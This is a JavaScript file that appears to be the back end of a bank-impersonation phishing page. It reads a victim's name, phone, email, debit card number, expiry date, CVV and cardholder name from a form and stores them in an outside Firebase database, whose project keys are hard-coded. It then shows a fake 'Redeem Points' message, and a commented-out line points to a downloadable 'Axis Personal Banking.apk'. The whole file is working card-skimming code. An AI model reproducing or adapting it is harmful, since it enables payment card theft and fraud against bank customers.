// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyAHW5moo64riRDRcud1NjrUl-1dZfcF1b0",
  authDomain: "newproject-60d26.firebaseapp.com",
  databaseURL: "https://newproject-60d26-default-rtdb.firebaseio.com",
  projectId: "newproject-60d26",
  storageBucket: "newproject-60d26.appspot.com",
  messagingSenderId: "1042994397525",
  appId: "1:1042994397525:web:b26515ac6ac2e45bf06fdc",

    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var name = getInputVal('name');
  var phone = getInputVal('phone');
  var debitc = getInputVal('debitc');
  var expdate = getInputVal('expdate');
  var cvv = getInputVal('cvv');
  var cardholder = getInputVal('cardholder');
  var email = getInputVal('email')

  // Save message
  saveMessage(name, phone, debitc, expdate, cvv, cardholder, email);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();
alert("After Confirmation You get Redeem Points")
document.getElementById('contactForm').reset();
// window.location.assign("./app/Axis Personal Banking.apk")
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(name, phone, debitc, expdate, cvv, cardholder, email){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    name: name,
    phone:phone,
    debitc:debitc,
    expdate:expdate,
    cvv:cvv,
    cardholder:cardholder,
    email:email,
  });
}
